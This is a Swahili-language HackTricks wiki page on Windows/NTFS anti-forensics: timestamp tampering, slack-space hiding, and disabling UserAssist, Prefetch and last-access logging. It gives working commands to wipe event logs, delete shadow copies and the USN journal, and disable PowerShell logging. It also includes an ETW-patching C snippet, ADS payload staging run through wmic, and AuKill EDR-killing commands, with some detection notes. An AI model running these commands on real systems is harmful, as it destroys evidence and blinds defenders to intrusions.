# Mbinu za Anti-Forensic

{{#include ../../banners/hacktricks-training.md}}

## Wakati

Mshambuliaji anaweza kuwa na hamu ya **kubadilisha wakati wa faili** ili kuepuka kugunduliwa.\
Inawezekana kupata wakati ndani ya MFT katika sifa `$STANDARD_INFORMATION` \_\_ na \_\_ `$FILE_NAME`.

Sifa zote zina wakati 4: **Mabadiliko**, **ufikiaji**, **kuundwa**, na **mabadiliko ya rejista ya MFT** (MACE au MACB).

**Windows explorer** na zana nyingine zinaonyesha taarifa kutoka **`$STANDARD_INFORMATION`**.

### TimeStomp - Zana ya Anti-forensic

Zana hii **inabadilisha** taarifa za wakati ndani ya **`$STANDARD_INFORMATION`** **lakini** **sio** taarifa ndani ya **`$FILE_NAME`**. Hivyo, inawezekana **kubaini** **shughuli** **za kutatanisha**.

### Usnjrnl

**USN Journal** (Jarida la Nambari ya Mfululizo wa Sasisho) ni kipengele cha NTFS (mfumo wa faili wa Windows NT) kinachofuatilia mabadiliko ya kiasi. Zana ya [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) inaruhusu uchambuzi wa mabadiliko haya.

![](<../../images/image (801).png>)

Picha ya awali ni **matokeo** yanayoonyeshwa na **zana** ambapo inaonekana kuwa baadhi ya **mabadiliko yalifanywa** kwa faili.

### $LogFile

**Mabadiliko yote ya metadata kwa mfumo wa faili yanarekodiwa** katika mchakato unaojulikana kama [kuandika kabla ya kurekodi](https://en.wikipedia.org/wiki/Write-ahead_logging). Metadata iliyorekodiwa inahifadhiwa katika faili inayoitwa `**$LogFile**`, iliyoko katika saraka ya mzizi ya mfumo wa faili wa NTFS. Zana kama [LogFileParser](https://github.com/jschicht/LogFileParser) zinaweza kutumika kuchambua faili hii na kubaini mabadiliko.

![](<../../images/image (137).png>)

Tena, katika matokeo ya zana inawezekana kuona kuwa **baadhi ya mabadiliko yalifanywa**.

Kwa kutumia zana hiyo hiyo inawezekana kubaini **ni wakati gani wakati ulipobadilishwa**:

![](<../../images/image (1089).png>)

- CTIME: Wakati wa kuundwa wa faili
- ATIME: Wakati wa mabadiliko ya faili
- MTIME: Mabadiliko ya rejista ya MFT ya faili
- RTIME: Wakati wa ufikiaji wa faili

### Ulinganisho wa `$STANDARD_INFORMATION` na `$FILE_NAME`

Njia nyingine ya kubaini faili zilizobadilishwa kwa kutatanisha ni kulinganisha wakati kwenye sifa zote mbili kutafuta **mismatch**.

### Nanoseconds

**Wakati wa NTFS** una **usahihi** wa **nanoseconds 100**. Hivyo, kupata faili zikiwa na wakati kama 2010-10-10 10:10:**00.000:0000 ni ya kutatanisha sana**.

### SetMace - Zana ya Anti-forensic

Zana hii inaweza kubadilisha sifa zote mbili `$STARNDAR_INFORMATION` na `$FILE_NAME`. Hata hivyo, kuanzia Windows Vista, ni lazima kwa OS hai kubadilisha taarifa hii.

## Kuficha Data

NFTS inatumia klasta na ukubwa wa habari wa chini. Hii inamaanisha kwamba ikiwa faili inachukua klasta na nusu, **nusu iliyobaki haitatumika kamwe** hadi faili itakapofutwa. Hivyo, inawezekana **kuficha data katika nafasi hii ya slack**.

Kuna zana kama slacker zinazoruhusu kuficha data katika nafasi hii "iliyojificha". Hata hivyo, uchambuzi wa `$logfile` na `$usnjrnl` unaweza kuonyesha kuwa baadhi ya data iliongezwa:

![](<../../images/image (1060).png>)

Hivyo, inawezekana kurejesha nafasi ya slack kwa kutumia zana kama FTK Imager. Kumbuka kuwa aina hii ya zana inaweza kuhifadhi maudhui yaliyofichwa au hata yaliyosimbwa.

## UsbKill

Hii ni zana ambayo it **izima kompyuta ikiwa mabadiliko yoyote katika USB** bandari yanagundulika.\
Njia moja ya kugundua hii ni kukagua michakato inayotembea na **kurejea kila script ya python inayotembea**.

## Usambazaji wa Linux Hai

Hizi distros zina **tekelezwa ndani ya RAM** kumbukumbu. Njia pekee ya kuzigundua ni **ikiwa mfumo wa faili wa NTFS umewekwa na ruhusa za kuandika**. Ikiwa umewekwa tu na ruhusa za kusoma haitakuwa rahisi kugundua uvamizi.

## Kufuta Salama

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Mipangilio ya Windows

Inawezekana kuzima mbinu kadhaa za kurekodi za windows ili kufanya uchunguzi wa forensics kuwa mgumu zaidi.

### Zima Wakati - UserAssist

Hii ni funguo ya rejista inayohifadhi tarehe na saa wakati kila executable ilipokimbizwa na mtumiaji.

Kuzima UserAssist kunahitaji hatua mbili:

1. Weka funguo mbili za rejista, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` na `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, zote kuwa sifuri ili kuashiria kwamba tunataka UserAssist izimwe.
2. Futa subtree zako za rejista ambazo zinaonekana kama `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Zima Wakati - Prefetch

Hii itahifadhi taarifa kuhusu programu zilizotekelezwa kwa lengo la kuboresha utendaji wa mfumo wa Windows. Hata hivyo, hii inaweza pia kuwa muhimu kwa mazoea ya forensics.

- Tekeleza `regedit`
- Chagua njia ya faili `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Bonyeza kulia kwenye `EnablePrefetcher` na `EnableSuperfetch`
- Chagua Badilisha kwenye kila moja ya hizi kubadilisha thamani kutoka 1 (au 3) hadi 0
- Anzisha upya

### Zima Wakati - Wakati wa Mwisho wa Ufikiaji

Wakati folder inafunguliwa kutoka kiasi cha NTFS kwenye seva ya Windows NT, mfumo unachukua wakati wa **kupdate uwanja wa wakati kwenye kila folder iliyoorodheshwa**, inayoitwa wakati wa mwisho wa ufikiaji. Katika kiasi cha NTFS kinachotumiwa sana, hii inaweza kuathiri utendaji.

1. Fungua Mhariri wa Rejista (Regedit.exe).
2. Tembelea `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Tafuta `NtfsDisableLastAccessUpdate`. Ikiwa haipo, ongeza hii DWORD na weka thamani yake kuwa 1, ambayo itazima mchakato.
4. Funga Mhariri wa Rejista, na upya seva.

### Futa Historia ya USB

**Kila Kuingia ya Kifaa cha USB** inahifadhiwa katika Rejista ya Windows Chini ya funguo ya **USBSTOR** ambayo ina funguo ndogo ambazo zinaundwa kila wakati unapoingiza Kifaa cha USB kwenye PC au Laptop yako. Unaweza kupata funguo hii hapa `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Kufuta hii** utafuta historia ya USB.\
Unaweza pia kutumia zana [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) ili kuwa na uhakika umekifuta (na kufuta).

Faili nyingine inayohifadhi taarifa kuhusu USB ni faili `setupapi.dev.log` ndani ya `C:\Windows\INF`. Hii pia inapaswa kufutwa.

### Zima Nakala za Kivuli

**Orodha** nakala za kivuli kwa `vssadmin list shadowstorage`\
**Futa** kwa kuendesha `vssadmin delete shadow`

Unaweza pia kuzifuta kupitia GUI ukifuatia hatua zilizopendekezwa katika [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Ili kuzima nakala za kivuli [hatua kutoka hapa](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Fungua programu za Huduma kwa kuandika "services" kwenye kisanduku cha kutafuta maandiko baada ya kubonyeza kitufe cha kuanza cha Windows.
2. Kutoka kwenye orodha, pata "Volume Shadow Copy", chagua, kisha upate Mali kwa kubonyeza kulia.
3. Chagua Zime kutoka kwenye orodha ya "Aina ya Kuanzisha", kisha thibitisha mabadiliko kwa kubonyeza Tumia na Sawa.

Inawezekana pia kubadilisha mipangilio ya faili zipi zitakazokopwa katika nakala ya kivuli katika rejista `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Andika faili zilizofutwa

- Unaweza kutumia **zana ya Windows**: `cipher /w:C` Hii itamwambia cipher kuondoa data yoyote kutoka kwa nafasi isiyotumika ya diski ndani ya diski ya C.
- Unaweza pia kutumia zana kama [**Eraser**](https://eraser.heidi.ie)

### Futa kumbukumbu za matukio ya Windows

- Windows + R --> eventvwr.msc --> Panua "Kumbukumbu za Windows" --> Bonyeza kulia kila kikundi na chagua "Futa Kumbukumbu"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Zima kumbukumbu za matukio ya Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Ndani ya sehemu za huduma zima huduma "Windows Event Log"
- `WEvtUtil.exec clear-log` au `WEvtUtil.exe cl`

### Zima $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Kurekodi na Kudanganya Nyayo za Juu (2023-2025)

### Kurekodi ScriptBlock/Module ya PowerShell

Matoleo ya hivi karibuni ya Windows 10/11 na Windows Server yana **vithibitisho vya PowerShell vya forensics** chini ya
`Microsoft-Windows-PowerShell/Operational` (matukio 4104/4105/4106).
Mshambuliaji anaweza kuzima au kufuta mara moja:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Walinda wanapaswa kufuatilia mabadiliko kwenye funguo hizo za rejista na kuondolewa kwa wingi kwa matukio ya PowerShell.

### ETW (Event Tracing for Windows) Patch

Bidhaa za usalama wa mwisho zinategemea sana ETW. Njia maarufu ya kuepuka mwaka wa 2024 ni kupachika `ntdll!EtwEventWrite`/`EtwEventWriteFull` kwenye kumbukumbu ili kila wito wa ETW urudishe `STATUS_SUCCESS` bila kutoa tukio:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (e.g. `EtwTiSwallow`) zinafanya kazi sawa katika PowerShell au C++.  
Kwa sababu ya patch ni **process-local**, EDRs zinazotembea ndani ya michakato mingine zinaweza kukosa.  
Uchunguzi: linganisha `ntdll` katika kumbukumbu dhidi ya kwenye diski, au hook kabla ya user-mode.

### Urejeleaji wa Mito ya Takwimu Mbadala (ADS)

Kampeni za malware mwaka 2023 (e.g. **FIN12** loaders) zimeonekana zikifanya hatua ya pili ya binaries ndani ya ADS ili kubaki nje ya mtazamo wa skana za jadi:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumerate streams with `dir /R`, `Get-Item -Stream *`, or Sysinternals `streams64.exe`. Kuiga faili la mwenyeji kwa FAT/exFAT au kupitia SMB kutafuta mtiririko wa siri na inaweza kutumika na wachunguzi kurejesha mzigo.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver sasa hutumiwa mara kwa mara kwa **anti-forensics** katika uvamizi wa ransomware. Zana ya chanzo wazi **AuKill** inachukua dereva ulioidhinishwa lakini dhaifu (`procexp152.sys`) kusimamisha au kumaliza EDR na sensorer za forensics **kabla ya usimbaji na uharibifu wa kumbukumbu**:
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Dereva huondolewa baadaye, ikiacha artefaki chache.

Mitigations: wezesha orodha ya kuzuia dereva dhaifu ya Microsoft (HVCI/SAC), na onya juu ya uundaji wa huduma za kernel kutoka kwa njia zinazoweza kuandikwa na mtumiaji.

---

## References

- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (Machi 2023)
https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (Juni 2024)
https://redcanary.com/blog/etw-patching-detection

{{#include ../../banners/hacktricks-training.md}}
